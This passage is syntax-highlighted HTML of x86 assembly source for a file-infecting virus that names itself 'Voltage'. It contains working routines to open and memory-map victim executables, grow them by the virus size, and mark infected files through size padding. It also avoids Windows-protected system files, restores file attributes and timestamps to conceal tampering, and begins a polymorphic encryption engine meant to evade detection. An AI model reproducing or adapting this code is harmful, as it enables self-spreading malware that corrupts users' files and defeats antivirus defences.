    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;remove SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">SFP_Check_Error_Handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;remove SEH</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    
    </span><span class="sc5">SFC_DLL</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SFC.DLL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hSfc</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">_SfcIsFileProtected</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SfcIsFileProtected"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">SfcIsFileProtected</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">Unicode_Path</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">200h</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;200=2 max_path</span><span class="sc0">
    
    </span><span class="sc5">CP_ACP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">RemoveFileAttributes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldFileAttribute</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">OldFileAttribute</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
</span><span class="sc5">RestoreFileAttributes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldFileAttribute</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">PadFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pad_size</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">RestoreFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">OpenFileErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FileSizeErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2800h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">FileSizeErr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">300000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">FileSizeErr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pad_size</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">          </span><span class="sc1">;already infected ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">___1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Infection_Success</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FileSizeErr</span><span class="sc0">
</span><span class="sc5">___1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">FileSizeErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">MapFileErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">MapFileErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FileSizeErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">OpenFileErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
    </span><span class="sc5">FileSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hfile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">hmap</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">mapbase</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">CreationTime</span><span class="sc0">        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">LastAccessTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">LastWriteTime</span><span class="sc0">       </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    
    
</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc5">warning</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Warning!!!:Voltage virus is going to infect this file,press yes to infect"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    
    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
    </span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
    </span><span class="sc5">FILE_BEGIN</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">MB_YESNO</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
    </span><span class="sc5">IDYES</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    
</span><span class="sc1">;eax - file size</span><span class="sc0">
</span><span class="sc5">pad_size</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0"> </span><span class="sc1">;101d</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">no_pad</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">no_pad</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc1">;Voltage PolyMorphic Engine:</span><span class="sc0">
</span><span class="sc1">;---------------------------</span><span class="sc0">
</span><span class="sc1">;encrypt code with 4 bytes key with diffrent way each time</span><span class="sc0">
</span><span class="sc1">;and create polymorphic decryptor,the polymorphic decryptor</span><span class="sc0">
</span><span class="sc1">;has diffrent instructions that do the same thing mixed with</span><span class="sc0">
</span><span class="sc1">;junk code.</span><span class="sc0">


</span><span class="sc5">CreateDecryptor</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitRandomNumber</span><span class="sc0">    </span><span class="sc1">;init random number generator</span><span class="sc0">
